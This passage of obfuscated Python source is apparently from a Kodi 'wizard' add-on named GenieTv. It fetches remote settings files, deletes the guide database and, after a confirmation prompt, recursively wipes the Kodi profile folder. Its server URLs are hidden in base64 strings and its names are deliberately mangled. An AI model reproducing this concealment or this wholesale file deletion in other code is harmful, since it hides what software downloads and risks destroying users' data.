  if inc < 2 : i1iiIIiiI111 = xbmcgui . Dialog ( ) ; i1iiIIiiI111 . ok ( 'Check My IP' , "[B][COLOR gold]Your IP Address is: [/COLOR][/B] %s" % iI1IiiiI , '[B][COLOR gold]Your IP is based in: [/COLOR][/B] %s' % iioOo00O0o , '[B][COLOR gold]Your Service Provider is:[/COLOR][/B] %s' % iI11IIi1iiI1I )
  inc = inc + 1
  if 83 - 83: Oo / oOO
  if 11 - 11: OOooOOo - OoOoOO00 % Ooo0OO0oOO . OoOoOO00
  if 65 - 65: Ooo0OO0oOO . i11iIiiIii % i11i1 * II1i1IiiIIi11 % Oo
  if 51 - 51: Ooo00oOo00o % II1i1IiiIIi11
  if 24 - 24: OOOo0 / iIii1I11I1II1 / O0 . iIii1I11I1II1 - Ooo00oOo00o . iIii1I11I1II1
  if 8 - 8: ii11ii1ii % Ooo00oOo00o % Ooo0OO0oOO . ii11ii1ii * ii11ii1ii
  if 94 - 94: i11iIiiIii + OoooooooOO
  if 20 - 20: i11iIiiIii
  if 86 - 86: I1IiI / i11i1
def Iii1II1i11II1 ( url , name ) :
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 if i1iiIIiiI111 . yesno ( "GenieTv" , '                                    Install Latest .ini File' ) :
  print '###' + o0oOoO00o + ' - CUSTOM FTV INI###'
  O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  I11OoooO = os . path . join ( O00OoOO0oo0 , 'addons2.ini' )
  iii1 = i1 . http_GET ( url ) . content
  IiIIIIIi = open ( I11OoooO , "w" )
  IiIIIIIi . write ( iii1 )
  IiIIIIIi . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( I11OoooO ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "                               Done Adding New .ini File" )
 return
 if 15 - 15: Ooo0OO0oOO / I1I1ii * Ooo00oOo00o % Ooo0OO0oOO % II1i1IiiIIi11 % Oo
def iIiiI1II11I ( url , name ) :
 i1iiIIiiI111 = xbmcgui . Dialog ( )
 if i1iiIIiiI111 . yesno ( "GenieTv" , '                               Install Custom Settings' ) :
  print '###' + o0oOoO00o + ' - CUSTOM FTV SETTINGS###'
  O00OoOO0oo0 = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  I11OoooO = os . path . join ( O00OoOO0oo0 , 'settings.xml' )
  iii1 = i1 . http_GET ( url ) . content
  IiIIIIIi = open ( I11OoooO , "w" )
  IiIIIIIi . write ( iii1 )
  IiIIIIIi . close ( )
  print '=== GenieTv - WRITING NEW    ' + str ( I11OoooO ) + '    ==='
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "                               Done Adding New Settings" )
 return
 if 62 - 62: II1i1IiiIIi11 * OOoo0OO0 + OOooOOo
 if 54 - 54: OOOo0 . Ooo0OO0oOO + I1IiI % I1I1ii * I1I1ii
def oOOoOiiiIi1III11i ( ) :
 try :
  OO00OoO = xbmc . translatePath ( os . path . join ( 'special://masterprofile/addon_data/plugin.video.GenieTv' , '' ) )
  if os . path . exists ( OO00OoO ) == True :
   i1iiIIiiI111 = xbmcgui . Dialog ( )
   if i1iiIIiiI111 . yesno ( "GenieTv" , "                               Delete FTV Guide Database" ) :
    IIii = os . path . join ( OO00OoO , "source.db" )
    os . unlink ( IIii )
  i1iiIIiiI111 . ok ( "GenieTv" , "                                     FTV Database Reset" )
 except :
  i1iiIIiiI111 = xbmcgui . Dialog ( )
  i1iiIIiiI111 . ok ( o0oOoO00o , "               Error Deleting Database No Database To Delete" )
 return
 if 24 - 24: OOOo0 - i1IIi - O0 % I1I1ii - iIii1I11I1II1 . OOoo0OO0
 if 26 - 26: Ooo00oOo00o % i1IIi * O0 . I1I1ii
 if 31 - 31: O0 - iI1Ii11iII1 * i11iIiiIii * i1IIi
 if 78 - 78: oOO * I1IiI . oO0O . I1IiI % iIii1I11I1II1
 if 67 - 67: oO0O . Oo
def I1ii1Ii1 ( url ) :
 oO0o = urllib2 . Request ( url )
 oO0o . add_header ( 'User-Agent' , 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.9.0.3) Gecko/2008092417 Firefox/3.0.3' )
 iIiIiIIiiiI1iI1 = urllib2 . urlopen ( oO0o )
 iii1 = iIiIiIIiiiI1iI1 . read ( )
 iIiIiIIiiiI1iI1 . close ( )
 return iii1
 if 39 - 39: OOoo0OO0 * I1I1ii
 if 63 - 63: oOO % OOOo0 . i11i1 - oOO / Oo % OOOo0
 if 39 - 39: OOooOOo . i1IIi % Ooo0OO0oOO / OOoo0OO0 % O0
 if 100 - 100: I1I1ii - I1IiI
 if 78 - 78: OoooooooOO - I1IiI . i11iIiiIii
 if 36 - 36: Ooo0OO0oOO * II1i1IiiIIi11 + iI1Ii11iII1 * II1i1IiiIIi11 . ii11ii1ii - iIii1I11I1II1
 if 14 - 14: OOoo0OO0 * Ooo0OO0oOO + i11iIiiIii
def o0o0o ( params ) :
 plugintools . log ( "freshstart.main_list " + repr ( params ) ) ; IiIiiIiii = plugintools . message_yes_no ( o0oOoO00o , "Do you wish to restore your" , "Kodi configuration to default settings?" )
 if IiIiiIiii :
  I111I = xbmcaddon . Addon ( id = o00 ) . getAddonInfo ( 'path' ) ; I111I = xbmc . translatePath ( I111I ) ;
  ooOo0oo = os . path . join ( I111I , ".." , ".." ) ; ooOo0oo = os . path . abspath ( ooOo0oo ) ; plugintools . log ( "freshstart.main_list xbmcPath=" + ooOo0oo ) ; O00OO0oOIi1IIiii1Ii = False
  try :
   for OooO0oOo , iiIi1IIiI , i1oO0OO0 in os . walk ( ooOo0oo , topdown = True ) :
    iiIi1IIiI [ : ] = [ O0Oo0o000oO for O0Oo0o000oO in iiIi1IIiI if O0Oo0o000oO not in iiIIIII1i1iI ]
    for oO00oooOOoOo0 in i1oO0OO0 :
     try : os . remove ( os . path . join ( OooO0oOo , oO00oooOOoOo0 ) )
     except :
      if oO00oooOOoOo0 not in [ "Addons15.db" , "MyVideos75.db" , "Textures13.db" , "xbmc.log" ] : O00OO0oOIi1IIiii1Ii = True
      plugintools . log ( "Error removing " + OooO0oOo + " " + oO00oooOOoOo0 )
    for oO00oooOOoOo0 in iiIi1IIiI :
     try : os . rmdir ( os . path . join ( OooO0oOo , oO00oooOOoOo0 ) )
     except :
      if oO00oooOOoOo0 not in [ "Database" , "userdata" ] : O00OO0oOIi1IIiii1Ii = True
      plugintools . log ( "Error removing " + OooO0oOo + " " + oO00oooOOoOo0 )
   if not O00OO0oOIi1IIiii1Ii : plugintools . log ( "freshstart.main_list All user files removed, you now have a clean install" ) ; plugintools . message ( o0oOoO00o , "The process is complete, you're now back to a fresh Kodi configuration with GenieTv!" , "Please reboot your system or restart Kodi in order for the changes to be applied." )
   else : plugintools . log ( "freshstart.main_list User files partially removed" ) ; plugintools . message ( o0oOoO00o , "The process is complete, you're now back to a fresh Kodi configuration with GenieTv" , "Please reboot your system or restart Kodi in order for the changes to be applied." )
  except : plugintools . message ( o0oOoO00o , "Problem found" , "Your settings has not been changed" ) ; import traceback ; plugintools . log ( traceback . format_exc ( ) ) ; plugintools . log ( "freshstart.main_list NOT removed" )
  plugintools . add_item ( action = "" , title = "Now Exit Kodi" , folder = False )
 else : plugintools . message ( o0oOoO00o , "Your settings" , "has not been changed" ) ; plugintools . add_item ( action = "" , title = "Done" , folder = False )
 oO00OoOO ( )
 if 48 - 48: OOooOOo + ii11ii1ii / ii11ii1ii
 if 80 - 80: OoooooooOO
 if 65 - 65: Ooo0OO0oOO * i1IIi . OoooooooOO % oOO
def OoOo00oOoo0oO ( ) :
 i1ii1iIII = [ ]
 oooo = sys . argv [ 2 ]
 if len ( oooo ) >= 2 :
  ooo0000oo0 = sys . argv [ 2 ]
  O0oooo000o = ooo0000oo0 . replace ( '?' , '' )
  if ( ooo0000oo0 [ len ( ooo0000oo0 ) - 1 ] == '/' ) :
   ooo0000oo0 = ooo0000oo0 [ 0 : len ( ooo0000oo0 ) - 2 ]
  IIiIiI11II = O0oooo000o . split ( '&' )
  i1ii1iIII = { }
  for ii1ii1I1IIi1 in range ( len ( IIiIiI11II ) ) :
   oOo00 = { }
   oOo00 = IIiIiI11II [ ii1ii1I1IIi1 ] . split ( '=' )
   if ( len ( oOo00 ) ) == 2 :
    i1ii1iIII [ oOo00 [ 0 ] ] = oOo00 [ 1 ]
    if 75 - 75: iIii1I11I1II1 / OoOoOO00 / oO0O / I1IiI
 return i1ii1iIII
 if 77 - 77: I1IiI
o0O0O0o0o0o = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20v' )
O00O0OO00oo = base64 . decodestring ( 'L3N0b3JhZ2UvZW11bGF0ZWQvMA==' )
IIIIIiI = base64 . decodestring ( 'L2dlbmllLnR4dA==' )
i111 = base64 . decodestring ( 'LmFyY2hpdGVjdHMueDEwaG9zdC5jb20vdGVzdC93aC50eHQ=' )
I1iOOOO = base64 . decodestring ( 'aHR0cDovL2ZpeGVzLmFyY2hpdGVjdHMueDEwaG9zdC5jb20vZml4ZXMudHh0' )
ii1II1I = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vYXBwcy9hcHBzLnhtbA==' )
o0O0o = base64 . decodestring ( 'L2FkZG9ucy9uZXcudHh0' )
oOoo0 = base64 . decodestring ( 'aHR0cDovL2FyY2hpdGVjdHMueDEwaG9zdC5jb20vdm9kL3ZvZC5waHA=' )
O0ooO = base64 . decodestring ( 'L2FkZG9ucy9pcHR2LnR4dA==' )
Oo0O00OO = base64 . decodestring ( 'L2FkZG9ucy92aWRlby50eHQ=' )
I1iIiI = base64 . decodestring ( 'L2FkZG9ucy9zcG9ydHMudHh0' )
Oo0o0OoOoOo0 = base64 . decodestring ( 'L2FkZG9ucy9raWRzLnR4dA==' )
iII1i111iI = base64 . decodestring ( 'L2FkZG9ucy9tdXNpYy50eHQ=' )
OoO00oO0o00 = base64 . decodestring ( 'L2FkZG9ucy9wcm9ncmFtcy50eHQ=' )
oOoO0o0o = base64 . decodestring ( 'L2FkZG9ucy94eHgudHh0' )
oOo0O = base64 . decodestring ( 'L2FkZG9ucy9yZXBvLnR4dA==' )
OOoOoO00O0O0o = base64 . decodestring ( 'L2FkZG9ucy9wYWNrcy50eHQ=' )
oo0o0o = base64 . decodestring ( 'L2FkZG9ucy9za2lucy50eHQ=' )
OO0oO0o = base64 . decodestring ( 'L2FkZG9ucy9hcnQudHh0' )
O00OO0oO = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2dvdGhhbS50eHQ=' )
iI1IiIIiIIi = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2hlbGl4LnR4dA==' )
o00oO0 = base64 . decodestring ( 'L2FkZG9ucy9Ta2luc2lzZW5nYXJkLnR4dA==' )
IIiIi1II1IiI = base64 . decodestring ( 'L2FkZG9ucy9SU1MudHh0' )
OO0o0oO0O000o = base64 . decodestring ( 'Q1VOVA==' )
def iIiIIIi ( name , url , mode , iconimage , fanart , description , showcontext = True , allinfo = { } ) :
 O00oO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 I1i1iii = True
 IiI1iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 IiI1iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 IiI1iI1 . setProperty ( "Fanart_Image" , fanart )
 if showcontext :
  I1III1I11I1 = [ ]
  if showcontext == 'fav' :
   I1III1I11I1 . append ( ( 'Remove from Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10056&name=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) ) ) )
  if not name in O000OO0 :
   I1III1I11I1 . append ( ( 'Add to Genie TV Favorites' , 'XBMC.RunPlugin(%s?mode=10055&name=%s&url=%s&iconimage=%s&fanart=%s&fav_mode=%s)'
 % ( sys . argv [ 0 ] , urllib . quote_plus ( name ) , urllib . quote_plus ( url ) , urllib . quote_plus ( iconimage ) , urllib . quote_plus ( fanart ) , mode ) ) )
  IiI1iI1 . addContextMenuItems ( I1III1I11I1 )
 I1i1iii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = O00oO0o , listitem = IiI1iI1 , isFolder = True )
 return I1i1iii
 if 25 - 25: iI1Ii11iII1 * I1I1ii - Ooo0OO0oOO * i11iIiiIii * OOOo0 * i11i1
def oo00O00oO ( name , url , mode , iconimage , fanart , description ) :
 O00oO0o = sys . argv [ 0 ] + "?url=" + urllib . quote_plus ( url ) + "&mode=" + str ( mode ) + "&name=" + urllib . quote_plus ( name ) + "&iconimage=" + urllib . quote_plus ( iconimage ) + "&fanart=" + urllib . quote_plus ( fanart ) + "&description=" + urllib . quote_plus ( description )
 I1i1iii = True
 IiI1iI1 = xbmcgui . ListItem ( name , iconImage = "DefaultFolder.png" , thumbnailImage = iconimage )
 IiI1iI1 . setInfo ( type = "Video" , infoLabels = { "Title" : name , "Plot" : description } )
 IiI1iI1 . setProperty ( "Fanart_Image" , fanart )
 I1i1iii = xbmcplugin . addDirectoryItem ( handle = int ( sys . argv [ 1 ] ) , url = O00oO0o , listitem = IiI1iI1 , isFolder = False )
 return I1i1iii
 if 56 - 56: OoooooooOO . OOOo0 . OoOoOO00 % II1i1IiiIIi11
 if 59 - 59: oOO % Oo - Ooo0OO0oOO + iI1Ii11iII1
ooo0000oo0 = OoOo00oOoo0oO ( )
ooooO0oOoOOoO = None
oO00oooOOoOo0 = None
OOoOoo00Oo = None
OOOO0OOO = None
i1i1ii = None
Iiii1iI1i = None
I1IIII = None
if 69 - 69: iI1Ii11iII1
if 24 - 24: Ooo00oOo00o / O0 * oOO % iIii1I11I1II1 + i1IIi % O0
try :
 I1IIII = int ( ooo0000oo0 [ "fav_mode" ] )
except :
 pass
 if 26 - 26: oOO + iI1Ii11iII1 - O0 * Ooo0OO0oOO * OoOoOO00 . ii11ii1ii
try :
 ooooO0oOoOOoO = urllib . unquote_plus ( ooo0000oo0 [ "url" ] )
except :
 pass
try :
 oO00oooOOoOo0 = urllib . unquote_plus ( ooo0000oo0 [ "name" ] )
except :
 pass
try :
 OOOO0OOO = urllib . unquote_plus ( ooo0000oo0 [ "iconimage" ] )
except :
 pass
try :
 OOoOoo00Oo = int ( ooo0000oo0 [ "mode" ] )
except :
 pass
try :
 i1i1ii = urllib . unquote_plus ( ooo0000oo0 [ "fanart" ] )
except :
 pass
try :
 Iiii1iI1i = urllib . unquote_plus ( ooo0000oo0 [ "description" ] )
except :
 pass
 if 75 - 75: I1IiI / OoooooooOO / OOoo0OO0 % I1IiI * oO0O * iI1Ii11iII1
 if 11 - 11: ii11ii1ii / i11i1 . oO0O * ii11ii1ii
print str ( O0OoO000O0OO ) + ': ' + str ( O00ooOO )
print "Mode: " + str ( OOoOoo00Oo )
print "URL: " + str ( ooooO0oOoOOoO )
print "Name: " + str ( oO00oooOOoOo0 )
print "IconImage: " + str ( OOOO0OOO )
if 17 - 17: ii11ii1ii * OoooooooOO % i1IIi % OoooooooOO . II1i1IiiIIi11
if 20 - 20: Ooo00oOo00o . Ooo0OO0oOO
def i1IIIiiII1 ( content , viewType ) :
 if 4 - 4: Oo % oO0O % Ooo00oOo00o * II1i1IiiIIi11 % OoooooooOO
 if content :
  xbmcplugin . setContent ( int ( sys . argv [ 1 ] ) , content )
 if o0oO0 . getSetting ( 'auto-view' ) == 'true' :
  xbmc . executebuiltin ( "Container.SetViewMode(%s)" % o0oO0 . getSetting ( viewType ) )
  if 38 - 38: OoooooooOO . II1i1IiiIIi11
  if 43 - 43: OoooooooOO
if OOoOoo00Oo == None :
 oooooOoo0ooo ( )
 if 8 - 8: i11i1 + OOoo0OO0 . OOoo0OO0
elif OOoOoo00Oo == 1 :
 O0oOooo0OOooO ( ooooO0oOoOOoO )
 if 89 - 89: ii11ii1ii * ii11ii1ii * I1IiI / II1i1IiiIIi11
elif OOoOoo00Oo == 44 :
 OOOOoo ( ooooO0oOoOOoO )
 if 60 - 60: Ooo00oOo00o / II1i1IiiIIi11 / OOOo0 + Ooo0OO0oOO
elif OOoOoo00Oo == 2 :
 o0Ooo0o0ooo0 ( )
 if 93 - 93: OoooooooOO * oO0O / O0 + oO0O - iIii1I11I1II1
elif OOoOoo00Oo == 3 :
 o00OO00O0oOO ( )
 if 6 - 6: iI1Ii11iII1 - Oo - OOoo0OO0 - O0 % OoooooooOO
elif OOoOoo00Oo == 21 :
 iI1Ii11111iIi ( )
 if 88 - 88: O0 / OOooOOo * OOooOOo . OOooOOo . O0
elif OOoOoo00Oo == 4 :
 III ( )
 if 27 - 27: i11iIiiIii % II1i1IiiIIi11 + oO0O . i11i1
elif OOoOoo00Oo == 5 :
 IIIII1I1Ii11iI ( oO00oooOOoOo0 , ooooO0oOoOOoO , Iiii1iI1i )
 if 9 - 9: Ooo00oOo00o
elif OOoOoo00Oo == 6 :
 IiIIiIiIIiI ( ooooO0oOoOOoO )
 if 43 - 43: oO0O . i11i1 + OOOo0 * i11iIiiIii
elif OOoOoo00Oo == 7 :
 IIIiii ( ooooO0oOoOOoO , oO00oooOOoOo0 )
 if 2 - 2: i11i1
elif OOoOoo00Oo == 8 :
 oOOO00OOo ( ooooO0oOoOOoO , oO00oooOOoOo0 )
 if 3 - 3: OOOo0 . II1i1IiiIIi11 % O0 - oOO / O0
elif OOoOoo00Oo == 9 :
 FIXREPOSADDONS ( ooooO0oOoOOoO )
 if 79 - 79: oO0O + Ooo0OO0oOO % oOO % OOOo0
elif OOoOoo00Oo == 10 :
 O0O0Oooo0o ( )
 if 68 - 68: OoOoOO00 - OoooooooOO / iIii1I11I1II1 - OOooOOo % OoOoOO00
elif OOoOoo00Oo == 11 :
 IiiIi ( ooooO0oOoOOoO )
 if 53 - 53: II1i1IiiIIi11 . Ooo0OO0oOO / Oo . Ooo00oOo00o . i11iIiiIii
elif OOoOoo00Oo == 12 :
 o0o0O0o0O ( )
 if 60 - 60: OoOoOO00
elif OOoOoo00Oo == 13 :
 ooooOOo ( )
 if 25 - 25: Oo + OOooOOo - Ooo00oOo00o
elif OOoOoo00Oo == 14 :
 oOoOo00oo ( ooooO0oOoOOoO )
 if 57 - 57: OoOoOO00 . i1IIi
elif OOoOoo00Oo == 15 :
 oOo0oO ( )
 if 33 - 33: II1i1IiiIIi11 + Oo % OOoo0OO0 . Ooo0OO0oOO
elif OOoOoo00Oo == 16 :
 Iii1II1i11II1 ( ooooO0oOoOOoO , oO00oooOOoOo0 )
 if 6 - 6: iI1Ii11iII1 + ii11ii1ii
elif OOoOoo00Oo == 17 :
 iIiiI1II11I ( ooooO0oOoOOoO , oO00oooOOoOo0 )
 if 62 - 62: Ooo0OO0oOO . I1I1ii - OoooooooOO * OoOoOO00 . i11iIiiIii
elif OOoOoo00Oo == 18 :
 oOOoOiiiIi1III11i ( )
 if 13 - 13: iIii1I11I1II1 * OOooOOo - i11iIiiIii
elif OOoOoo00Oo == 19 :
 OOooO ( oO00oooOOoOo0 , ooooO0oOoOOoO , Iiii1iI1i )
 if 63 - 63: OoooooooOO * I1I1ii
elif OOoOoo00Oo == 40 :
 O0o0O0OO00o ( oO00oooOOoOo0 , ooooO0oOoOOoO , Iiii1iI1i )
 if 50 - 50: Oo - OOooOOo % OoOoOO00 . O0 . Ooo0OO0oOO % OoOoOO00
elif OOoOoo00Oo == 42 :
 IiIIiIIIiIii ( oO00oooOOoOo0 , ooooO0oOoOOoO , Iiii1iI1i )
 if 18 - 18: OOoo0OO0 % OoooooooOO + Ooo00oOo00o / OOoo0OO0
elif OOoOoo00Oo == 43 :
 oOo0o0O ( oO00oooOOoOo0 , ooooO0oOoOOoO , Iiii1iI1i )
 if 37 - 37: i1IIi - oO0O / iI1Ii11iII1 . OoOoOO00 % oOO
elif OOoOoo00Oo == 20 :
 OooO0ooo0o ( ooooO0oOoOOoO )
 if 39 - 39: oO0O % i11iIiiIii * Ooo00oOo00o
elif OOoOoo00Oo == 22 :
 OoiIIii1Ii1 ( ooooO0oOoOOoO )
 if 23 - 23: i11i1 + oOO / i11iIiiIii * Oo . Ooo00oOo00o
elif OOoOoo00Oo == 23 :
 O0O00O ( ooooO0oOoOOoO )
 if 28 - 28: II1i1IiiIIi11 - OOooOOo
elif OOoOoo00Oo == 24 :
 OO0OOO ( ooooO0oOoOOoO )
 if 92 - 92: Oo % OOooOOo - oOO / oOO / I1IiI
elif OOoOoo00Oo == 25 :
 O0oOo0o0000 ( ooooO0oOoOOoO )
 if 84 - 84: i11i1
elif OOoOoo00Oo == 26 :
 oO000O ( ooooO0oOoOOoO )
 if 4 - 4: iI1Ii11iII1 . I1I1ii / oO0O / II1i1IiiIIi11 + OoOoOO00
elif OOoOoo00Oo == 27 :
 O0ooO0 ( ooooO0oOoOOoO )
 if 32 - 32: i1IIi + iIii1I11I1II1 . ii11ii1ii . OOoo0OO0 - oO0O
elif OOoOoo00Oo == 28 :
 iiI1II1II111 ( ooooO0oOoOOoO )
 if 55 - 55: ii11ii1ii / OoooooooOO - Ooo00oOo00o / OOOo0
elif OOoOoo00Oo == 29 :
 OOO0OOoOOO ( ooooO0oOoOOoO )
 if 23 - 23: OOoo0OO0 * I1I1ii * OOooOOo - OOOo0 % I1IiI + OOooOOo
elif OOoOoo00Oo == 30 :
 OoO00o0 ( ooooO0oOoOOoO )
 if 41 - 41: iI1Ii11iII1 * OoooooooOO . oOO % i11iIiiIii
elif OOoOoo00Oo == 31 :
 i1iI11iI ( ooooO0oOoOOoO )
 if 11 - 11: iIii1I11I1II1 . I1I1ii - Oo / OOoo0OO0 + OoOoOO00
elif OOoOoo00Oo == 32 :
 iIi1i ( )
 if 29 - 29: OOoo0OO0 . i11iIiiIii + i1IIi - oO0O + O0 . OOOo0
elif OOoOoo00Oo == 33 :
 iiI11I1i1i1iI ( )
 if 8 - 8: OOooOOo
elif OOoOoo00Oo == 35 :
 O0ooOo0o0Oo ( ooooO0oOoOOoO )
 if 78 - 78: i1IIi - Oo
elif OOoOoo00Oo == 34 :
 O0OO0oOOo ( ooooO0oOoOOoO )
 if 48 - 48: oO0O - OoooooooOO + I1I1ii % OOooOOo - I1IiI . OOOo0
elif OOoOoo00Oo == 36 :
 oooo00 ( ooooO0oOoOOoO )
 if 42 - 42: I1I1ii
elif OOoOoo00Oo == 37 :
 I11oo0ooOO ( ooooO0oOoOOoO )
 if 70 - 70: OOooOOo / OOoo0OO0 + Ooo0OO0oOO % OOOo0 % Oo + Ooo00oOo00o
elif OOoOoo00Oo == 38 :
 iIIII1i ( ooooO0oOoOOoO )
 if 80 - 80: i11i1
elif OOoOoo00Oo == 41 :
 o0o0o ( ooo0000oo0 )
 if 12 - 12: oO0O
elif OOoOoo00Oo == 39 :
 I1II1iIi ( ooooO0oOoOOoO )
 if 2 - 2: OoooooooOO
elif OOoOoo00Oo == 45 :
 TEXTS ( )
 if 100 - 100: Oo / O0 * i11iIiiIii * OoooooooOO
elif OOoOoo00Oo == 46 :
 iiIiiiIii11i1 ( )
 if 46 - 46: O0 % OoooooooOO
elif OOoOoo00Oo == 47 :
 GEVID ( )
 if 22 - 22: II1i1IiiIIi11 + OoooooooOO - I1IiI - Ooo00oOo00o * I1I1ii - Ooo0OO0oOO
elif OOoOoo00Oo == 48 :
 o00O ( oO00oooOOoOo0 , ooooO0oOoOOoO , Iiii1iI1i )
 if 99 - 99: oOO / OOOo0 . oO0O - oO0O * OOOo0
elif OOoOoo00Oo == 49 :
 oOOIi1II ( )
 if 24 - 24: OOoo0OO0 * Ooo00oOo00o - Ooo0OO0oOO / iIii1I11I1II1 - Oo . i11i1
elif OOoOoo00Oo == 222 :
 I1i111I ( ooooO0oOoOOoO )
 if 2 - 2: oOO - O0 - ii11ii1ii / OOoo0OO0 * I1IiI
elif OOoOoo00Oo == 333 :
 IiI1iI1I1 ( ooooO0oOoOOoO )
 if 26 - 26: ii11ii1ii + I1I1ii - Ooo0OO0oOO + iI1Ii11iII1 % i11i1
 if 84 - 84: OOoo0OO0 % oO0O % O0 * OOooOOo
elif OOoOoo00Oo == 1020 :
 Iiii11 ( )
 if 15 - 15: Ooo0OO0oOO - iIii1I11I1II1 - OoOoOO00 - iI1Ii11iII1 % ii11ii1ii
elif OOoOoo00Oo == 1021 :
 ANIMEEP ( )
 if 80 - 80: iI1Ii11iII1 * II1i1IiiIIi11 . i1IIi % oO0O % ii11ii1ii + oOO
elif OOoOoo00Oo == 1022 :
 ANIMEPLAY ( ooooO0oOoOOoO )
 if 6 - 6: ii11ii1ii . Ooo0OO0oOO . Ooo00oOo00o + iI1Ii11iII1
elif OOoOoo00Oo == 1001 :
 O00oOoo00O ( )
 if 65 - 65: ii11ii1ii / oOO
elif OOoOoo00Oo == 1005 :
 Oo0ooo ( )
 if 23 - 23: i11i1 / i11i1 * OOooOOo * i11i1
elif OOoOoo00Oo == 1007 :
 Oo00o00 ( ooooO0oOoOOoO )
 if 57 - 57: II1i1IiiIIi11
elif OOoOoo00Oo == 1010 :
 i1iiiiii1 ( ooooO0oOoOOoO )
 if 29 - 29: OOOo0
elif OOoOoo00Oo == 1011 :
 OoO0oOOOO ( ooooO0oOoOOoO )
 if 41 - 41: I1I1ii * Ooo00oOo00o - II1i1IiiIIi11 . oO0O
elif OOoOoo00Oo == 1030 :
 o0oo00OOOo ( )
 if 41 - 41: iIii1I11I1II1 - O0 - ii11ii1ii - Ooo0OO0oOO + I1I1ii
elif OOoOoo00Oo == 1031 :
 oo0oO ( ooooO0oOoOOoO , OOOO0OOO )
 if 22 - 22: O0 % iI1Ii11iII1 % II1i1IiiIIi11 % OOOo0
elif OOoOoo00Oo == 1006 :
 Parse . ParseURL ( ooooO0oOoOOoO )
 if 34 - 34: II1i1IiiIIi11 . Oo % ii11ii1ii . II1i1IiiIIi11 % iI1Ii11iII1 / iI1Ii11iII1
elif OOoOoo00Oo == 2030 :
 Parse . addonParseURL ( ooooO0oOoOOoO )
 if 84 - 84: oO0O
elif OOoOoo00Oo == 2031 :
 Parse . apkParseURL ( ooooO0oOoOOoO )
 if 1 - 1: Ooo0OO0oOO - Oo * iIii1I11I1II1 * Oo * i1IIi
elif OOoOoo00Oo == 1002 :
 iiIII1i1 ( ooooO0oOoOOoO )
 if 9 - 9: II1i1IiiIIi11 - II1i1IiiIIi11
elif OOoOoo00Oo == 1003 :
 oOOo0OOoOO0 ( ooooO0oOoOOoO , OOOO0OOO )
 if 3 - 3: O0 + O0 - O0 - O0 % OoooooooOO + Ooo0OO0oOO
elif OOoOoo00Oo == 1004 :
 IiIiIIi1IiiIi1III ( ooooO0oOoOOoO )
 if 20 - 20: Ooo00oOo00o + OOoo0OO0 . OoOoOO00 / i11iIiiIii
elif OOoOoo00Oo == 1008 :
 ii1I ( )
 if 50 - 50: OoooooooOO / Ooo00oOo00o % iIii1I11I1II1
elif OOoOoo00Oo == 1009 :
 M3UPLAY ( ooooO0oOoOOoO )
 if 41 - 41: ii11ii1ii % ii11ii1ii + iI1Ii11iII1 . II1i1IiiIIi11 % I1I1ii * oOO
elif OOoOoo00Oo == 2001 :
 Oo00o ( ooooO0oOoOOoO )
 if 57 - 57: oO0O . I1I1ii . OoOoOO00 % OoooooooOO * O0 + iIii1I11I1II1
elif OOoOoo00Oo == 1013 :
 IiI ( )
 if 94 - 94: i1IIi * Ooo00oOo00o * I1IiI
elif OOoOoo00Oo == 1014 :
 IIOO ( )
 if 93 - 93: oOO / i11i1 * O0
elif OOoOoo00Oo == 1015 :
 Ooo000o0oo0 ( ooooO0oOoOOoO )
 if 17 - 17: Ooo00oOo00o / oOO % OOOo0
elif OOoOoo00Oo == 1016 :
 O00O0 ( ooooO0oOoOOoO , OOOO0OOO , oO00oooOOoOo0 )
 if 47 - 47: Oo * Ooo00oOo00o / OOooOOo * OOOo0
elif OOoOoo00Oo == 1023 :
 IIIii ( )
 if 60 - 60: ii11ii1ii / iI1Ii11iII1 . i11iIiiIii / Ooo00oOo00o % OoOoOO00
elif OOoOoo00Oo == 1024 :
 iIiOo ( )
 if 6 - 6: II1i1IiiIIi11 % OOooOOo + I1I1ii
elif OOoOoo00Oo == 1025 :
 iiI11111II ( ooooO0oOoOOoO )
 if 91 - 91: OOooOOo + O0 * Ooo0OO0oOO * iI1Ii11iII1 * ii11ii1ii
elif OOoOoo00Oo == 4001 :
 I1111IIi ( )
 if 83 - 83: OoooooooOO
elif OOoOoo00Oo == 4002 :
 Oo0oO ( )
 if 52 - 52: OOooOOo / I1IiI % Ooo0OO0oOO % Ooo00oOo00o / iI1Ii11iII1 % OOooOOo
elif OOoOoo00Oo == 4003 :
 oOOoo0o0OOOO ( )
 if 88 - 88: i11i1 / i11iIiiIii / oO0O / i11iIiiIii * ii11ii1ii % OOoo0OO0
elif OOoOoo00Oo == 4004 :
 iIiii1i111iI1 ( )
 if 43 - 43: I1IiI * Ooo00oOo00o % i1IIi * oO0O + iIii1I11I1II1
elif OOoOoo00Oo == 4005 :
 OoO ( )
 if 80 - 80: OOooOOo . II1i1IiiIIi11 . OoooooooOO
elif OOoOoo00Oo == 4006 :
 O00 ( )
 if 63 - 63: oOO . i11i1
elif OOoOoo00Oo == 4007 :
 I1i ( )
 if 66 - 66: OOOo0
elif OOoOoo00Oo == 4008 :
 OOOOO0oo0O0O0 ( )
